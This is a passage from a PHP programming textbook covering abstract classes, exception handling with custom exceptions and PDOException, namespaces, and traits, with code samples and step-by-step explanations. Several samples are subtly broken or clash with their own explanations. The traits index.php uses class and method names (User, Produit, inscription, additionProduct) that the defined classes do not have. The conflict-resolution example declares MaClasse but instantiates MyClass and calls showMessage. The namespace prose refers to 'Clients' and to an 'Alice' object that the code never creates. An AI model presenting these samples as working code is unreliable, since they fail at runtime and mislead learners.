In this code, we define a Rectangle class that extends the abstract Shape class. This means that the Rectangle class inherits all the abstract methods of the Shape class and must implement them.

 

The Rectangle class has two private properties, $length and $width, which represent the dimensions of the rectangle. These properties are initialized in the class constructor.

 

The calculateArea() method is an abstract method defined in the Shape class. In the Rectangle class, we need to provide a concrete implementation for this method. Here, in the Rectangle class's calculateArea() method, we simply return the product of length and width to calculate the surface area of the rectangle.

 

In short, the Rectangle class extends the abstract Shape class, implements the abstract calculateArea() method and provides a concrete implementation for this method, tailored to the specific properties of a rectangle.

 

You can then instantiate the Rectangle class and indirectly use the abstract Shape class accordingly. In the index.php file, insert the following code:

 

 

<?php  
  
 require\_once "Rectangle.php";  
  
 // Using the Rectangle class  
 $rectangle1 = new Rectangle(5, 3);  
 echo "Rectangle area : ".$rectangle1\->calculateArea()."<br>";  
 $rectangle1\->displayType();

 

 

When you run this code, you will get the following result:

 

![Image](images/image-188.png)

 

### Abstract classes and behavior of derived classes

 

In the scenario where we have, for example, an abstract class Person, this class acts as a common base model to represent the characteristics and behaviors shared by all types of people, but it cannot be instantiated directly. Specific classes such as Author, Teacher, Student, and Admin extend the abstract class Person, thereby inheriting its properties and methods, while also having the ability to define their own specific attributes and behaviors.

 

For instance, the abstract class Person could define properties such as name, age, and email address, as well as methods like introduce() to allow each type of person to introduce themselves in a general manner. The child classes such as Author, Teacher, Student, and Admin would inherit these basic attributes and methods, but could also define their own methods specific to their role or responsibilities, such as publishBook() for an author or teachClass() for a teacher.

 

By inheriting from the abstract class Person, each subclass benefits from a common structure and can be treated uniformly when manipulated by methods or functions that expect to receive an instance of Person. However, each child class has the flexibility to specialize its behavior by defining methods specific to its role. This allows for modular management and logical organization of different categories of people in a software system.

![Image](images/image-189.png)

 

##  

## Differences between interfaces and abstract classes

Interfaces and abstract classes are fundamental concepts in object-oriented programming, but they have distinct characteristics that make them suitable for different situations and design needs. Here are the main differences between interfaces and abstract classes:

 

 

Definition:

*   Interface: An interface defines a behavioral contract by specifying the methods a class must implement, but does not provide a concrete implementation of these methods.
*   Abstract class: An abstract class can include both abstract (non-implemented) and concrete (implemented) methods, providing a combination of structure and behavior.

 

Implementation :

 

*   Interface: A class implements an interface by providing concrete definitions of all the methods declared in the interface.
*   Abstract class: A class extends an abstract class by providing implementations for all abstract methods defined in the abstract class, while also being able to redefine or extend existing concrete methods.

 

Inheritance :

 

*   Interface: A class can implement several interfaces, enabling it to define multiple behaviors.
*   Abstract class: A class can extend a single abstract class, enabling more specific behavioral specialization.

 

Flexibility :

 

*   Interface: Interfaces offer maximum flexibility by enabling a class to implement behaviors that are totally independent of each other, thus promoting modular design.
*   Abstract class: Abstract classes offer more limited flexibility, as a class can only extend a single abstract class, which ties the class more closely to a specific class hierarchy.

 

By understanding these fundamental differences between interfaces and abstract classes, developers can choose the approach that best suits the specific needs of their application and software architecture.

## Conclusion

In this chapter, we have explored the concepts of interfaces and abstract classes in PHP, which are powerful tools of object-oriented programming. We have learned how to define, use, and implement interfaces, as well as create and extend abstract classes. We have also examined the differences between the two approaches and discussed their appropriate use cases.

 

Interfaces provide a way to define flexible behavioral contracts between classes, promoting code composability and modularity. They allow adding functionality to existing classes without modifying their class hierarchy, making them particularly useful in situations where flexibility and compatibility are important.

 

On the other hand, abstract classes provide a common structure with shared behaviors and allow for establishing a specific class hierarchy. They offer a partial implementation of methods and can serve as a starting point for more specialized derived classes.

 

By judiciously combining the use of interfaces and abstract classes, developers can design robust, flexible, and modular software systems capable of adapting to changes and evolving with project needs.

 

# Chapter 18

# Exception handling

 

 

Exception handling is an essential component of any robust software system. In programming, exceptions are events that occur during program execution and interrupt the normal flow of operations due to an abnormal situation or error. Exceptions can be caused by a variety of factors, such as syntax errors, logic errors, unforeseen conditions or errors originating from external resources.

 

In this chapter, we'll explore in detail what exception handling is, why it's important and how it's implemented in PHP. We'll discover the basic concepts related to exceptions, best practices for handling them effectively and how to use the mechanisms provided by PHP to detect, report and handle exceptions in our programs. By understanding how to handle exceptions, developers can improve the reliability, robustness and security of their applications, guaranteeing a better user experience and better code maintenance.

 

 

## Introduction to Exceptions

### Definition of Exceptions

 

An exception is an anomaly or an unexpected condition that occurs during the execution of a program and disrupts the normal flow of execution. More precisely, an exception indicates a situation where something unexpected has happened and the program doesn't know how to handle it.

 

In PHP, an exception is represented by an instance of the predefined class Exception or one of its subclasses. When an exception is thrown, it is usually accompanied by a message describing the error that occurred.

 

Exceptions can be caused by various reasons, such as syntax errors, logic errors, input/output errors, database errors, or any other unexpected condition that prevents the program from functioning correctly.

 

The proper use of exceptions allows for more effective error handling and ensures better reliability and robustness of applications. By identifying and handling exceptions appropriately, developers can create more stable and reliable applications, thus providing a better user experience.

 

### Exceptions and error types

 

Exceptions can be triggered by various types of error encountered during program execution. Here are some of the common types of error that can trigger exceptions:

 

Syntax errors: Syntax errors occur when code does not respect the syntax of the programming language. For example, a syntax error can occur due to a typo, an omission of a semicolon or the incorrect use of control structures.

 

Logic errors: Logic errors occur when code doesn't work as expected due to a misunderstanding of the problem to be solved or a poor implementation of the algorithm. These errors can lead to unexpected situations or incorrect results.

 

Runtime errors: Runtime errors occur during program execution and can be caused by factors such as incorrect data, unavailable resources, hardware problems or unforeseen conditions. For example, an execution error may occur when an attempt is made to access a non-existent file or an unavailable network resource.

 

Data manipulation errors: Data manipulation errors occur when there is a problem with the data itself, such as missing, incorrect or corrupted data. For example, an error may occur when converting a string into a number if the string does not represent a valid number.

 

Input/Output (I/O) errors: I/O errors occur when there is a problem with I/O operations, such as reading or writing files, communicating with peripherals or accessing external resources. These errors can be caused by problems such as missing files, insufficient authorizations or hardware errors.

 

In short, exceptions can be triggered by various types of error, whether related to code syntax, logic, execution, data manipulation or I/O operations. Appropriate handling of these exceptions is essential to guarantee the reliability and stability of applications.

 

### Exceptions management objectives

 

The objectives of exception handling are manifold, and are mainly aimed at improving the reliability, robustness and maintainability of applications. Here are some of the key objectives of using exceptions:

 

Error handling: Exceptions provide a mechanism for handling errors in an efficient and structured way. They enable errors to be detected and reported as they occur, making them easier to resolve.

 

Improved code readability: By using exceptions, code can be structured in such a way that errors are handled separately from the normal flow of execution. This makes the code more readable and understandable, as exception handling blocks can be separated from the main business code.

 

Simplified error handling logic: Exceptions separate business logic from error handling logic. This simplifies code by moving error handling to specific parts of the code, facilitating maintenance and scalability.

 

Error propagation: Exceptions can be propagated through the various levels of an application, enabling errors to be traced back to the point where they can be handled appropriately. This ensures that errors are handled at an appropriate level, and avoids unexpected interruptions to the execution flow.

 

Centralized error handling: By using exceptions, errors can be handled centrally in a specific part of the application, like a global exception handler. This simplifies error management and enables better traceability of problems.

 

In short, exceptions play a crucial role in the creation of reliable, robust applications by enabling efficient error handling. They help to improve code quality, readability, maintainability and application stability.

## Uses of Exceptions

Exception handling in PHP allows you to manage errors and exceptional situations that may arise during program execution. You can throw an exception at any point in your code using the **throw** keyword. 

Here's how to use exceptions in PHP with relevant examples:

 

Consider the following code, which you can put in index.php, for example:

 

<?php  
 function calculateAge($birthYear) {  
 $currentYear = date("Y");  
 $age = $currentYear - $birthYear;  
 if ($age < 0) {  
 throw new Exception("Invalid birth year.");  
 }  
 return $age;  
 }  
  
 try {  
 echo calculateAge(2005); // Will display age if birth year is valid  
 } catch (Exception $e) {  
 echo "Error: " . $e\->getMessage();  
 }

 

 

This code defines a calculateAge() function which takes the year of birth as a parameter and returns the age calculated by subtracting this year of birth from the current year. If the calculated year is negative, which would indicate an invalid birth year, an Exception is thrown with the message "Invalid birth year".

 

Next, the code uses a **try-catch** block to call the calculateAge() function with a specific year of birth (in this example, 2005). If the year of birth is valid and the function calculAge() successfully returns the calculated age, this age is displayed. However, if an exception is raised during execution of the function (for example, due to an invalid year of birth), the catch block catches the exception and displays an appropriate error message.

Since the year (2005) of birth specified in this example is valid, the code will return the age by subtracting the year of birth from the current year.

 

 

However, if an invalid birth year is specified in the calculateAge() function parameter, for example calculateAge(2040), the code will generate an exception.

 

The error message displayed will be similar to the following:

 

![Image](images/image-190.png)

 

In this case, since the year of birth 2040 is in the future with respect to the current year, the calculated age would be negative. This would result in an exception with the message "Error: Invalid birth year.". The catch block then catches this exception of type Exception and displays the error message "Error: Invalid birth year".

 

### Customized exceptions

 

In many real-life cases, it is necessary to enrich exceptions with additional information such as specific error codes, contextual data or more descriptive messages. This facilitates debugging and long-term code maintenance. This often requires the creation of custom exceptions. These custom exceptions encapsulate specific error-handling behaviors, making the code more modular and easier to maintain. This approach also contributes to better error handling and a clearer organization of the code, improving the readability and maintainability of the application.

 

Create a new file named for example: fileRead.php, in which you put the following code:

 

 

<?php  
  
 // Define custom exception for file operations  
 class FileException extends Exception {  
 // Constructor with default message  
 public function \_\_construct($message \= "File error") {  
 parent::\_\_construct($message);  
 }  
  
  // Function to addition additional information  
  public function fileInfo() {  
 return "Problem with file path: " . $this\->getFile()  
 . "<br>"  
 . "Error line: " . $this\->getLine()  
 . "<br>"  
 . "Error code: " . $this\->getCode();  
 }  
 }  
  
 // File read function with custom exception handling  
 function fileRead($path) {  
 if (!file\_exists($path)) {  
 throw new FileException("The file '$path' does not exist.");  
 }  
 // File read code...  
 return "Contents of file '$path'";  
 }  
  
 // Using the function with exception handling  
 try {  
 echo fileRead("example.txt");  
 } catch (FileException $e) {  
 echo "Error: " . $e\->getMessage() . "<br>";  
 echo "Details: " . $e\->fileInfo();  
 }  
  
?>

 

 

This code defines a custom exception named FileException to handle errors related to file operations. Here's a detailed explanation of the code:

 

**Defining the FileException class**: This class extends PHP's basic Exception class, making it a custom exception. It has an fileInfo() method that returns additional information about the exception, such as the file path ($this->getFile()), the line ($this->getLine()) where the exception was raised and the associated error code ($this->getCode()). The getFile(), getLine() and getCode() methods are native methods of the Exception class.

 

**FileException class constructor:** The class constructor takes an optional $message parameter, which represents the error message to be displayed when a FileException is thrown. By default, this message is defined as "File error". The constructor then calls the constructor of the parent Exception class, passing the error message.

 

**readFile() function:** This function takes the path of the file to be read as a parameter. It first checks whether the file exists, using the **file\_exists()** function. If the file does not exist, it throws a FileException with a specific error message indicating that the file does not exist. Otherwise, it simulates the reading of the file, returning a message indicating the file's contents.

 

Using the function with exception handling: The code uses the fileRead() function to read the contents of a file named "example.txt". It is surrounded by a **try-catch** block to catch any FileException. If an exception is thrown, the error message is displayed to the user, along with further details provided by the exception's **fileInfo()** method.

 

In summary, this code illustrates the creation and use of a custom exception to handle errors specific to file operations, while providing additional information to facilitate debugging and troubleshooting.

 

At this point, if you run the fileRead.php file, you will get a result similar to the following:

 

![Image](images/image-191.png)

 

However, if you create a file named example.txt at the root of your project and run the fileRead.php file, you will get the following result:

 

![Image](images/image-192.png)

 

## PDOException in PHP

Database manipulation errors are a common occurrence in web development. PHP offers a specific exception class, PDOException, to handle these cases.

 

PDOException is a PHP-specific exception class that is triggered when an error occurs when using the PDO (PHP Data Objects) extension to access databases.

 

PDOException plays a crucial role in database error handling, enabling developers to efficiently capture, process and manage errors that occur during SQL query execution.

 

### Using PDOException

 

**Capture a PDOException**: PDO errors are automatically converted into PDOException instances. To capture a PDOException, you can use a try-catch block around the code that executes SQL queries.

**Error handling**: Once captured, a PDOException provides detailed information on the error, such as the error message, SQLSTATE error code and database-specific error code.

 

**Error handling**: Developers can use the information provided by PDOException to make appropriate decisions on how to handle errors, such as displaying user-friendly error messages or logging errors for debugging.

 

### PDOException example

 

Let's develop a simple code to connect to a database:

 

<?php  
 try {

 // Attempt to connect.  
 $db \= new PDO('mysql:host=localhost;dbname=Users','root','');  
 echo 'Connection successful!'; // If the connection is successful, this message will be displayed  
 }  
  
 catch (PDOException $e) // We catch PDOExceptions.  
 {  
 echo 'Connection failed.<br /\>';  
 echo $e->getMessage(); // The error number and message are displayed.  
 }

 

This code is an attempt to connect to a MySQL database using PDO (PHP Data Objects). Here's a detailed explanation:

 

The first line in the try block attempts to create a new instance of the PDO class to establish a connection to the database. The parameters passed are :

 

‘**mysql:host=localhost;dbname=Users**’: This specifies the database type (MySQL) as well as the host (localhost) and database name (Users) to connect to.

 

‘**root’**: This is the database user name.

The password is empty, but in a production environment it would be secure.

If the connection is successful, the message "Connection successful!" will appear on the screen.

 

If a PDOException is raised during the connection attempt (for example, due to a configuration or connection problem), the catch block will be executed. In this catch block, the message "Connection failed" will be displayed, followed by the specific error message retrieved from the exception, obtained by calling the getMessage() method on the $e exception object.

 

In short, this code attempts to connect to a MySQL database, and if successful, displays a success message. If not, it captures and displays error details if there's a problem during the connection.

 

At this point, executing this code will produce an error similar to the following result:

 

![Image](images/image-193.png)

 

This error message indicates that the attempt to connect to the database has failed. Here's a detailed explanation:

 

"Connection failed. This is the message we defined in the catch block to indicate that an error occurred during the connection attempt.

 

"SQLSTATE\[HY000\] \[1049\] Unknown database 'Users'": This is the specific error message returned by the database. It consists of three parts:

 

"SQLSTATE\[HY000\]": This is a standard SQL status code indicating the type of error. In this case, "\[HY000\]" means a general error.

 

"\[1049\]": This is a specific error code that identifies the type of error. In this case, code 1049 means "Unknown database", indicating that the database specified in the connection does not exist or cannot be accessed.

 

"Unknown database 'Users'": This is an additional description of the error, specifying that the database named "Users" is unknown or inaccessible.

 

In short, this error message indicates that there is a problem with the database specified in the connection, and more specifically, that the "Users" database does not exist or is not accessible.

 

## Conclusion

Exception handling is an essential practice in programming, enabling errors to be handled efficiently and elegantly. This chapter has helped us understand the importance of exceptions in software design, highlighting the different types of errors that can occur and presenting methods for handling them.

 

We explored the syntax and use of exceptions in PHP, highlighting the use of **try-catch** blocks to catch and handle exceptions. We also looked at the creation and use of custom exceptions, offering a flexible and modular way of handling errors specific to our applications.

 

Finally, we discuss the use of exceptions in practical contexts, such as database error handling with PDOException, providing concrete examples to illustrate their use.

 

By mastering exception handling, developers can improve the robustness, reliability and quality of their applications, ensuring appropriate error handling and facilitating the process of debugging and maintaining code.

 

 

 

# Chapter 19

# Namespaces

 

 

When you're working on a web development project, efficient file and resource management becomes crucial to keeping code organized and avoiding conflicts. Imagine yourself on your computer desktop, where you can't have two files with the same name in the same place. The same applies to your project directories. If you've worked on larger projects, you know that it can be difficult to guarantee the uniqueness of file, class, property or method names, especially when you're working in a team.

 

While you can avoid naming conflicts in a small project by keeping a clear overview of your application, this quickly becomes a challenge in larger projects involving hundreds or thousands of files and lines of code. Code modularization becomes essential, allowing each team member to work on separate parts of the project without the risk of interference.

 

This is where namespaces come in. By using namespaces in PHP, you can organize your code logically, avoid name conflicts and make your application more maintainable and extensible. In this chapter, we'll explore in detail the concepts of namespaces in PHP, their practical use and the benefits they offer in modern web application development.

 

## Issues

Suppose we wanted to develop a web application for a private school. We'd have, for example, a "Students" directory for files specific to pedagogical management and a "Customers" directory for files specific to administrative management. In each directory, we plan to create a "Person" class to represent the individuals associated with the school's various functions.

 

![Image](images/image-194.png)

 

 

In this context, when we use the Person class in another PHP file, such as index.php, it's highly likely that this use will be repeated several times. In such situations, it can become difficult to distinguish which Person class is actually being used. What's more, if we need to use both Person classes in the same file, we need to import them explicitly:

 

<?php  
  
 require\_once "Classes/Customers/Person.php";  
 require\_once "Classes/Students/Person.php";  
  
 $person1 \= new Person();  
  
?>

 

When this code is executed, it will produce an error similar to the following result:

 

![Image](images/image-195.png)

 

In this code, we import the Person.php file twice, once from the "Classes/Customers" directory and once from the "Classes/Students" directory. Next, we attempt to instantiate an object of the Person class. However, this will create ambiguity as we have two Person classes from two different namespaces. As a result, it's difficult to determine which of the two classes will be used to instantiate the $person1 object. This ambiguity can lead to errors or unexpected behavior.

 

 

To avoid these potential conflicts between classes with the same name, PHP offers a solution by allowing us to organize our classes in distinct namespaces. This concept is similar to that of Java packages, if you have any knowledge of Java development.

 

Namespaces allow us to assign a unique namespace to each set of classes, thus isolating them and avoiding name collisions between classes from different parts of the application. By using namespaces, we can organize our code logically and avoid ambiguities when using classes with the same name.

## How do you define namespaces in practice?

To use namespaces in your example above, you can define namespaces for each Person class in the Customers and Students directories, then import them into your index.php file. Here's how to do it:

 

In the Person.php file in the Customers directory :

 

 

<?php  
  
 namespace Customers;  
  
 class Person {  
 public function \_\_construct($amount, $financialSituation){  
 $this\->amount \= $amount;  
 $this\->financialSituation \= $financialSituation;  
 }  
  
 public function getCustomerInfo(){  
 echo "Amount paid: $this\->amount, 

 financial situation: $this\->financialSituation";  
 }  
 }  
  
?>

 

The namespace Clients; line declares that the Person class is part of the Clients namespace. By declaring namespace Customers;, all classes defined in this PHP file belong to the Clients namespace. So, to use the Person class in another file, you need to import this namespace with the use directive.

 

In the Person.php file in the Students directory :

 

<?php  
  
 namespace Students;  
  
 class Person {  
 public function \_\_construct($name, $email){  
 $this\->name \= $name;  
 $this\->email \= $email;  
 }  
  
 public function getStudentInfo(){  
 echo "Name: $this\->name,   
 Email: $this\->email";  
 }  
 }

 

 

Then, in the index.php file (or in another file where you want to use the Person classes), you import the Person classes using their corresponding namespaces :

 

<?php  
  
 require\_once "Classes/Customers/Person.php";  
 require\_once "Classes/Students/Person.php";  
  
 use Customers\\Person as CustomerPerson;  
 use Students\\Person as StudentPerson;  
  
 $studentPerson = new StudentPerson("Amine", "amine@gmail.com");  
 $customerPerson = new CustomerPerson(197, "Situation in order!");  
  
 $studentPerson\->getStudentInfo();  
 echo "<br>";  
 $customerPerson\->getCustomerInfo();  
  
?>

 

 

This code begins by including the PHP files containing the definitions of the Person classes for customers and students, using the require\_once instructions. It then uses the **use** directive to import the **namespaces** and associate **aliases** with the Person classes for customers and students, using the **as** keyword.

 

More specifically, the following lines :

 

 

 use Customers\\Person as CustomerPerson;  
 use Students\\Person as StudentPerson;

 

 

These lines tell PHP to import the Person classes from the Customer and Student namespaces, and rename them CustomerPerson and StudentPerson respectively.

 

Next, the code creates an instance of CustomerPerson with name "Alice" and e-mail "alice@gmail.com", then an instance of StudentPerson with name "Amine" and e-mail "amine@gmail.com". Finally, it calls the getCustomerInfo() and getStudentInfo() methods on these instances to display the corresponding informations.

 

When you run this code you will get a result similar to the following:

 

![Image](images/image-196.png)

 

## Conclusion

 

The namespaces in PHP are used to organize and hierarchize classes, interfaces, functions, and constants into distinct namespaces to avoid naming conflicts between elements of the code. Here is a summary of the namespace process:

 

Namespace Declaration: Namespaces are declared using the namespace keyword, followed by the namespace name. For example: namespace MyNamespace;.

 

Defining Classes within the Namespace: Once the namespace is declared, all classes, interfaces, functions, and constants defined in the PHP file will automatically be associated with that namespace, unless they are explicitly declared in another namespace.

 

Using Classes in Files: To use a class defined within a namespace, you can import the namespace with use and use an alias for the class if necessary. For example: use MyNamespace\\MyClass as AliasClass;.

 

In summary, namespaces allow for logical organization of code and prevention of naming conflicts, making PHP application development and maintenance easier.

# Chapter 20

# Traits

 

PHP traits represent a major innovation in the object-oriented programming paradigm. Faced with the absence of multiple inheritance, PHP developers have long sought elegant solutions for incorporating common functionality into their classes without compromising the structure of their code. Features have emerged as an answer to this challenge, offering a powerful alternative to multiple inheritance.

 

In this chapter, we'll take an in-depth look at traits in PHP, how they work, their usefulness and their advantages over other methods of sharing functionality. We'll discover how traits enable greater modularity, better code reuse and clearer organization of classes in a PHP project.

 

With this chapter, you'll develop an in-depth understanding of PHP traits and learn how to use them effectively to improve the structure, flexibility and maintainability of your PHP applications.

 

 

## Issues

In PHP, it is not possible for a class to inherit directly from several other classes simultaneously. Unlike some programming languages such as C++, Python or Perl, which support multiple inheritance, PHP does not. This means that PHP does not support multiple class inheritance.

 

However, PHP offers an alternative to multiple inheritance through the use of so-called "traits". Traits offer a practical and flexible solution for incorporating additional functionality into a class, bypassing the potential problems associated with multiple inheritance.

 

Traits are a PHP feature that enable code reuse. They allow common functionalities to be grouped together without resorting to inheritance, thus facilitating the flexible sharing of these functionalities between several classes.

 

It's important to note that the trait mechanism in PHP differs from the multiple inheritance mechanism found in other programming languages such as C++, Python or Perl.

 

Comparing inheritance and traits, we can see that, unlike inheritance, where a class inherits all the properties and methods of a parent class, traits enable you to select and incorporate specifically the functionality you need in a class. As a result, traits offer greater modularity and better code organization.

## Defining and using traits

PHP traits offer an elegant way of reusing code in multiple classes without using multiple inheritance. Features are a collection of methods and properties that can be incorporated into a class. Defined using the **trait** keyword, they offer the possibility of including both concrete and abstract methods, as well as properties. The major advantage of traits lies in their ability to group common functionalities together in one place, thus simplifying code maintenance and avoiding duplication.

 

To illustrate this, let's take the example of a school management application. In this context, different parts of the application, such as the student area, the teacher area, the parent area, etc., will require similar functionalities, such as login, logout and consultation methods. Repeating these blocks of code in each place where they are needed would be tedious and inefficient.

 

This is where traits come in. By using them, we can group these common functionalities together in one place, making them easier to maintain and avoiding code duplication. So, instead of writing the same code several times for each area of the application, we simply use the appropriate trait where necessary.

 

Now that we understand the importance and usefulness of traits, let's look at how to create and use them in a PHP application.

 

### Syntax

 

To declare a trait, use the trait keyword, followed by the name of the trait and its contents in braces. To use a trait in a class, use the use keyword followed by the trait name.

 

![Image](images/image-197.png)

 

Let's imagine you're developing an e-commerce application in object-oriented PHP, where you'll certainly need to create User and Product classes. Initially, you'd like to addition logging functionalities, i.e. recording important information or events during application execution, to various classes in your application. Then, for example, you'd like to addition validation functionality, checking whether the data provided in the program complies with certain predefined rules or conditions.

 

To begin with, you create a trait for logging functionality. In this example, we'll concentrate solely on the logging functionality.

 

Logging trait (Logging.php) :

 

<?php  
 Trait Logging {  
 public function logMessage($message) {  
 echo "\[" . date('Y-m-d H:i:s') . "\] " . $message . "<br>";  
 }  
 }

 

 

This PHP code defines a trait called "Logging" which provides logging functionality. Here's a detailed explanation:

 

**Logging trait { ... }** : This declares a trait named "Logging". Features are reusable blocks of code that can be incorporated into classes to provide them with additional functionality.

 

**public function logMessage($message) { ... }** : This is a method defined in the "Logging" trait. The "logMessage" method takes a $message parameter, which is the message to be logged. This method is public, which means it can be called from anywhere in the code where the trait is used.

This feature can then be used in other classes to easily addition this logging functionality**.**

 

Users class (Users.php) :

 

<?php  
 require\_once 'Logging.php';  
  
 class Users {  
 use Logging;  
  
 public function signUp($name) {  
 // User registration log  
 $this\->logMessage("User $name has registered.");  
 // Other registration operations  
 echo "Registration of user $name completed.<br>";  
 }  
 }  
?>

 

This PHP code begins by including the "Logging.php" file using the require\_once function. It then defines a class called "Users". Here's a detailed explanation:

 

**require\_once 'Logging.php';** : This line includes the "Logging.php" file, which contains the definition of the "Logging" trait. Including this file allows the "Users" class to use the "Logging" trait to addition logging functionality.

 

**use Logging** : This line uses the "Logging" trait in the "Users" class. This means that all methods defined in the "Logging" trait will be available for instances of the "Users" class.

 

**public function signUp($name) { ... }** : This line defines a public method called "signUp" specific to the "Users" class. This method takes a $name parameter, which represents the name of the user to be registered.

 

Product class (Product.php) :

 

 

<?php  
 require\_once 'Logging.php';  
  
 class Product {  
 use Logging;  
  
 public function addProduct($name, $quantity) {  
 // Log product addition  
 $this\->logMessage ("Addition product $name ($quantity units).");  
 // Other product addition operations  
 echo "Product $name added with $quantity units.<br>";  
 }  
 }  
?>

 

 

This PHP code begins by including the "Logging.php" file using the require\_once function, which enables the "Logging" trait to be used in the "Product" class. Here's an explanation of the essential code:

 

**require\_once 'Logging.php';** : This line includes the "Logging.php" file, which contains the definition of the "Logging" trait. This allows the "Product" class to use the functionalities defined in this trait.

 

**use Logging;** : This line uses the "Logging" trait in the "Product" class. This means that all methods defined in the "Logging" trait will be available for instances of the "Product" class.

 

**public function addProduct($name, $quantity) { ... }** : This line defines a public method called "addProduct" specific to the "Product" class. 

 

Main script (index.php) :

 

<?php  
 require\_once 'User.php';  
 require\_once 'Product.php';  
  
 // Using classes with logging functionality  
 $user \= new User();  
 $user->inscription("Amine Barak");  
  
 $produit \= new Produit();  
 $product->additionProduct("Book", 10);  
?>

 

This code illustrates the practical use of the "User" and "Product" classes with the logging functionality inherited from the Logging trait. It creates objects to represent a user and a product, then uses the methods of these objects to perform specific actions and record corresponding logs.

 

When the index.php file is executed, it will produce the following result:

 

![Image](images/image-198.png)

 

This outcome shows a message indicating that the user "Amine Barak" has registered, along with the date and time of registration. This is because of the call to the "registration" method of the "User" class, which employs the logging functionality to record this event.

 

Subsequently, a message is displayed indicating that the product "Book" has been added with a quantity of 10 units, along with the date and time of the addition. This is due to the call to the "addProduct" method of the "Product" class, which also utilizes the logging functionality to record this event.

 

In summary, executing the index.php file will exhibit messages indicating the actions carried out (user registration and product addition), along with the details of these actions, such as the date and time they were carried out, thanks to the logging functionality implemented in the "User" and "Product" classes.

## Method and/or property name conflicts

Since traits are designed to be reusable and can be incorporated into different classes independently, it's possible for two different traits to have methods or properties with the same name. Similarly, a trait may share the same name with a class in which it is used. These situations can lead to name conflicts and errors during program execution.

 

Examples:

 

Trait1.php

 

 

<?php

  
 trait Trait1 {  
 public function displayMessage() {  
 echo "Message from Trait1 <br\>";  
 }  
 }

 

 

Trait2.php

 

<?php

  
 trait Trait2 {  
 public function displayMessage() {  
 echo "Message from Trait2 <br\>";  
}  
}

 

 

These two code snippets each define a trait containing a method called "displayMessage()". Now let's imagine the creation of a class that uses these two traits:

 

MyClass.php

 

<?php  
 require\_once 'Trait1.php';  
 require\_once 'Trait2.php';  
  
 class MyClass {  
 use Trait1, Trait2 ;  
 }  
  
 $myObject1 \= new MyClass();  
 $myObject1->displayMessage();  
 

 

In this PHP code, the "Trait1.php" and "Trait2.php" files are included using the require\_once function, which accesses the definitions of the "Trait1" and "Trait2" traits. Next, a class called "MyClass" is defined, which uses both traits "Trait1" and "Trait2" **using** the **use** directive.

 

Next, an object named "$myObject1" from the "MyClass" class is instantiated using the new keyword. Finally, the "displayMessage()" method is called on this object.

 

However, given that the two traits used have a method with the same name "displayMessage()", this can lead to ambiguity. In this case, PHP will usually generate a fatal error indicating a name collision. As the code currently stands, an error would occur if the "displayMessage()" method is not correctly resolved due to the name conflict between the two traits.

 

![Image](images/image-199.png)

 

To avoid this, it is necessary to explicitly resolve the name conflict by using aliasing when using traits in the MyClass class:

 

<?php  
 require\_once 'Trait1.php';  
 require\_once 'Trait2.php';  
  
 class MaClasse {  
 use Trait1, Trait2 {  
 Trait1::displayMessage insteadof Trait2;  
 Trait2::displayMessage as displayMessage2;  
 }  
 }  
  
 $myObject1 \= new MyClass();  
 $myObject1->showMessage();

 echo "<br\>";  
 $myObject1->showMessage2();

 

In this corrected code, when declaring use, aliasing is used to resolve the name conflict between the "displayMessage()" methods of the two features. The "displayMessage()" method of "Trait1" is explicitly favored over that of "Trait2" using the keyword **insteadof**.

For Trait2's "displayMessage()" method, we've opted for an alias using the "as" keyword. So, to call this method, we'll need to use the name specified in the alias, which in this case is "displayMessage2()".

 

This code ensures that namespace conflicts between trait methods are resolved appropriately, thus ensuring error-free execution. The "displayMessage()" method from "Trait1" is used to display a Trait1-specific message, while the "displayMessage2()" method from "Trait2" is also used to display a trait2-specific message, thanks to aliasing used when including the traits.

 

Executing this code will produce the following result:

 

![Image](images/image-200.png)

 

This result clearly demonstrates that the two "displayMessage()" methods for features Trait1 and Trait2 were executed without encountering any collision errors.

 

## Practical example of order tracking

Let's say you're working on an e-commerce application and you're looking to integrate order tracking functionality into your product classes.

 

Let's create a trait named, for example, "OrderTracking" which provides order tracking functionality for products.

 

OrderTracking.php :

 

<?php  
 trait OrderTracking {  
 private $trackingCode;  
  
 public function setTrackingCode($trackingCode) {  
 $this\->trackingCode = $trackingCode;  
 }  
  
 public function getTrackingCode() {  
 return $this\->trackingCode;  
 }  
  
 public function trackOrder() {  
 // Code to perform order tracking  
 echo "Tracking number of the order: " . $this\->trackingCode;  
 }  
 }

 

 

Here is a detailed explanation of this code:

 

trait OrderTracking{ ... } : This line declares the "OrderTracking" trait, which contains methods for managing order tracking.

 

private $trackingCode; : This declares a private property called "$ trackingCode " which will be used to store the order tracking number.

 

public function setTrackingCode($trackingCode) { ... } : This method sets the order tracking number by assigning a value to the "$trackingCode" property.

 

public function getTrackingCode () { ... } : This method retrieves the order tracking number by returning the value of the "$trackingCode " property.

 

public function trackOrder() { ... } : This method tracks the order by displaying the order tracking number stored in the "$trackingCode " property.

 

echo "Order tracking number: " . $this->trackingcode; : This displays the order tracking number using the value of the "$trackingcode" property.

 

In summary, this "OrderTracking " trait provides methods for defining, retrieving and tracking an order's tracking number. It can be incorporated into product classes to addition order tracking functionality to these products.

 

Now let's create the Product class:

 

 

<?php

  
 require\_once 'OrderTracking.php';  
  
 class Product {  
 use OrderTracking;  
  
 private $name;  
 private $price;  
  
 public function \_\_construct($name, $price) {  
 $this\->name \= $name;  
 $this\->price \= $price;  
 }  
  
 // Other methods specific to the "Product" class  
 }  
 

 //Instantiation of the Product class  
  
$product1 = new Product("T-shirt", 19.99);  
$product1\->setTrackingCode("ABC123");  
$product1\->trackOrder();

 

?>

 

This PHP code includes the "OrderTracking.php" file, which contains the definition of the "OrderTracking" trait. Next, it defines a "Product" class that uses this " OrderTracking " trait **using** the **use** directive.

 

The "Product" class also has private "$name" and "$price" properties, as well as a "\_\_construct()" constructor method that takes the product name and price as parameters and initializes them.

 

Next, an instance of the "Product" class is created with the parameters "T-shirt" and "19.99". The order tracking number is set for this product using the "setTrackingCode ()" method of the " OrderTracking" trait. Finally, the "trackOrder()" method of the " OrderTracking" trait is called to display the order tracking number for this product.

 

In summary, this code illustrates how a "Product" class can use the "OrderTracking" trait to addition order tracking functionality to its instances.

 

Using this feature makes it easy to integrate order tracking functionality into different classes of the application, avoiding redundancy of tracking code with each implementation.

When this code is executed, it will produce the following result:

 

![Image](images/image-201.png)

 

 

## This practical example highlights the usefulness of traits for adding specific functionalities to classes, thus enhancing the modularity and reusability of the code in a concrete e-commerce context.

## Conclusion

PHP traits represent a powerful tool for improving code reusability, modularity and maintainability in object-oriented applications. By enabling the inclusion of common functionality in multiple classes without the need for multiple inheritance, traits offer a flexible and elegant alternative for sharing code between classes not linked by an inheritance hierarchy.

 

